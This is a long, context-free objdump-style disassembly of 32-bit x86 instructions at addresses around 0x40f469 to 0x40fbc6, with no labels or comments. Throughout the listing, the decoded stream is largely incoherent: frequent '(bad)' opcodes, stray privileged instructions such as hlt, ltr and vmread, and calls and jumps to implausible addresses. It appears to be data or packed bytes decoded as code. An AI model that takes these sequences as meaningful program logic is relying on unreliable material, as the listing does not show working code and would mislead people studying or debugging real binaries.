  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
